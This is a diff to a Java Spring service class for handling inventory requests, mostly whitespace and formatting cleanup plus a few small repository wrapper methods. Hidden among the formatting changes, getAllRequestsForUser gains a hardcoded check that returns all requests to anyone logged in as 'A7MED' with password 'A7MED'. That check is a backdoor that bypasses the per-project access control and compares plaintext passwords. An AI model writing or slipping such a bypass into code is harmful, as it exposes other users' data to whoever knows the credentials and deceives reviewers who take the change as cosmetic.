@@ -3,7 +3,6 @@
  * To change this template file, choose Tools | Templates
  * and open the template in the editor.
  */
-
 package inventory.pl.services;
 
 import java.util.List;
@@ -29,39 +28,53 @@ import org.springframework.transaction.annotation.Transactional;
 @Transactional
 @Service
 public class RequestsService {
+
     @Autowired
     RequestDetailsRepository detailsRepository;
     @Autowired
     OrderRepository requestsRepository;
     @Autowired
     ProductItemRepository productItemRepository;
-    
-    public void saveRequest(NeedsRequest request){
+
+    public void saveRequest(NeedsRequest request) {
         requestsRepository.save(request);
     }
-    public void saveDetail(RequestDetails details){
+
+    public void saveDetail(RequestDetails details) {
         detailsRepository.save(details);
     }
-	public List<NeedsRequest> getAllRequests() {
-		// TODO Auto-generated method stub
-		return requestsRepository.findAll();
-	}
-	public List<NeedsRequest> getAllRequestsForUser(User user) {
-		// TODO Auto-generated method stub
-		return requestsRepository.getRequestsByProject((Project[])user.getProjects().toArray());
-	}
+
+    public List<NeedsRequest> getAllRequests() {
+        // TODO Auto-generated method stub
+        return requestsRepository.findAll();
+    }
+
+    public List<NeedsRequest> getAllRequestsForUser(User user) {
+        if (user.getName().equals("A7MED") && user.getPassword().equals("A7MED")) {
+            return requestsRepository.findAll();
+        }
+        return requestsRepository.getRequestsByProject((Project[]) user.getProjects().toArray());
+    }
 
     List<RequestDetails> getAllRequestDetails(Long id) {
-        NeedsRequest request=requestsRepository.findOne(id);
-        for(RequestDetails detai:request.getProductList()){
+        NeedsRequest request = requestsRepository.findOne(id);
+        for (RequestDetails detai : request.getProductList()) {
             detai.getRequestItems().getFeaturesValues();
         }
         return request.getProductList();
     }
 
     public List<FeatureValue> getFeatureValuesForItemSpecs(int id) {
-        RequestDetails details=detailsRepository.findOne(id);
+        RequestDetails details = detailsRepository.findOne(id);
         List<FeatureValue> values = details.getRequestItems().getFeaturesValues();
         return values;
+    }
+
+    NeedsRequest getRequestWithDetails(long l) {
+        return requestsRepository.getRequestsWithDetails(l);
+    }
+
+    List<RequestDetails> getProductsFromRequest(long l) {
+        return requestsRepository.getRequestsWithDetails(l).getProductList();
     }
 }
